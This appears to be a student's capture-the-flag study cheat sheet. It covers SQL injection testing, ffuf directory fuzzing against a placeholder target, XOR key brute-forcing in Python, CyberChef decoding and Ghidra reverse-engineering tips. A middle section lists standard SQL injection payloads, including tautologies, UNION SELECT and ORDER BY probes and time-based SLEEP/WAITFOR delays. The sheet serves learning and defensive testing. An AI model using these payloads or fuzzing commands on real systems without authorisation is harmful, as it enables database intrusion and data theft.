(h1 SQL queries, SQL injection) 
<img width="785" height="561" alt="image" src="https://github.com/user-attachments/assets/2c02e188-76ce-4dfe-a40d-41540e98b711" />

<img width="926" height="568" alt="image" src="https://github.com/user-attachments/assets/0b49e9bc-f989-40ed-b413-87b2f55474af" />

If you're on the defensive side (which fits your cybersecurity studies), the simplest first test is the single quote '. If entering it into a search bar or URL parameter causes a 500 error or a database error message, that's a strong indicator the input isn't being parameterized.

FUFF COMMAND

ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt (GET THE WORLDLIST)

https://github.com/ffuf/ffuf

-fc 404 — filter out 404 status codes

-fs 1234 — filter by response size (useful when all "not found" pages have the same size)

-fw 50 — filter by word count

-fl 20 — filter by line count

-mc 200,301 — match only specific status codes

'

"

' OR '1'='1

" OR "1"="1

' OR 1=1 --

" OR 1=1 --

') OR ('1'='1

' UNION SELECT NULL --

' UNION SELECT NULL, NULL --

' UNION SELECT NULL, NULL, NULL --

1 OR 1=1

1' ORDER BY 1 --

1' ORDER BY 10 --

' AND 1=1 --

' AND 1=2 --

' WAITFOR DELAY '0:0:5' --

' AND SLEEP(5) --

strings -n 8 somebinary

strings REVEALS:

File paths and URLs:

Configuration data

xortool

XOR
for key in range(256):

    result = bytes([b ^ key for b in encrypted_data])
    
    if b"flag" in result or b"http" in result:
    
        print(f"Key: {hex(key)}, Result: {result}")

ciphertext = b'\x4a\x5f\x2b\x18'

known = b"flag"

key = bytes([c ^ k for c, k in zip(ciphertext, known)])

print(f"Key bytes: {key}")

https://gchq.github.io/CyberChef/

From Hex — if the data looks like 4a5f2b18

From Base64 — if it looks like Sl8rGA==

From Base32 — less common but shows up, looks like JJPSWEYA

URL Decode — if you see %4a%5f%2b%18

USE binwalk -e

From Binary — if it's literal 01001010 01011111

From Decimal — if it's numbers like 74 95 43 24

GHIDRA : 

WINDOW -> DEFINED STRINGS

SYMBOL TREE (ON LEFT) LOOK UNDER FUNCTIONS FOR MAIN, READ FOR THE OVERALL FLOW, WHAT IS HAPPENING TO IT

strcmp, strncmp, memcmp — direct comparisons, the expected value is often visible

strlen — tells you the expected input length

atoi, strtol — input is being converted to a number

malloc, calloc — dynamic memory, the size hints at data structure

printf with format strings — look for format string vulnerabilities

rand, srand — if seeded with a predictable value, the "random" numbers are reproducible

Custom functions with loops and XOR — likely encoding/decoding routines
